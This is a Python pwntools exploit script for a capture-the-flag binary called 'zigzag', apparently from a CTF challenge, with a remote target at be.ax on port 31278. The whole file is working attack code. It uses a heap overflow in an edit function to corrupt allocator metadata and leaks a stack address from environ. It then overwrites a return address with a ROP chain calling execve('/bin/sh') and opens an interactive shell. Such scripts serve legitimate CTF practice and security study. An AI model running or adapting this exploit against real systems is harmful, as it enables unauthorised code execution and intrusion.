#!/usr/bin/python3

from pwn import *

elf = ELF('zigzag')
context.arch = elf.arch
context.binary = elf
context.terminal = ["terminator", "-u", "-e"]

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "b *0x201fcf", # syscall
			# "b *0x202f06", # read edit
			# "b *0x202D11", # read add
			# "b *0x0000000000203147",
			"c"
		]), env=env)
	elif args.REMOTE:
		# return remote("localhost", 5000)
		return remote("be.ax", 31278)
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
ls = lambda s: log.success(s)
cl = lambda: p.clean(timeout=1)

def add(idx, size, data):
	li(f'add idx={idx} size={size}')
	sla(b'> ', b'1')
	sla(b'Index: ', str(idx).encode())
	sa(b'Size: ', str(size).encode())
	sa(b'Data: ', data)

def edit(idx, size, data):
	li(f'edit idx={idx} size={size}')
	sla(b'> ', b'4')
	sla(b'Index: ', str(idx).encode())
	sla(b'Size: ', str(size).encode())
	sa(b'Data: ', data)

def free(idx):
	li(f'free idx={idx}')
	sla(b'> ', b'2')
	sla(b'Index: ', str(idx).encode())

def show(idx):
	li(f'show idx={idx}')
	sla(b'> ', b'3')
	sla(b'Index: ', str(idx).encode())
	data = rl()
	return data

for i in range(0, 15):
	add(i, 0x100, p8(i)*0x100)
add(15, 0x100, b'2'*0x20)

# clear out alloc_cursor and used_count to have "fresh" bucket
# -8 because we want to make our data adjacent to the next 8 bytes containing stack address
edit(14, 0x228, b'A' * 0x210 + p64(0x208110-0x8) + p64(0) + p64(0)) 
add(16, 0x100, b'/bin/sh\x00')

leak_stack = show(16)
# print(leak_stack)
leak_stack = u64(leak_stack[8:16].ljust(8, b'\x00'))

ls(f"environ = {hex(leak_stack)}")

retaddr_read = leak_stack-0xe0
ls(f"retaddr to overwrite = {hex(retaddr_read)}")
edit(14, 0x228, b'A' * 0x210 + p64(retaddr_read) + p64(0) + p64(0))

# 0x0000000000203147 : pop rdi ; ret
# 0x000000000020351b : pop rsi ; ret
# 0x0000000000202b07 : xor edx, edx ; syscall
# 0x0000000000203bdb : mov rax, rsi ; or rdx, rdi ; ret

add(17, 0x100, b''.join([
	p64(0x0000000000203147) 
	,p64(0x208110-0x8) 
	,p64(0x000000000020351b)
	,p64(0x3b)
	,p64(0x0000000000203bdb) 
	,p64(0x000000000020351b)
	,p64(0)
	,p64(0x0000000000202b07)
]))

ia()
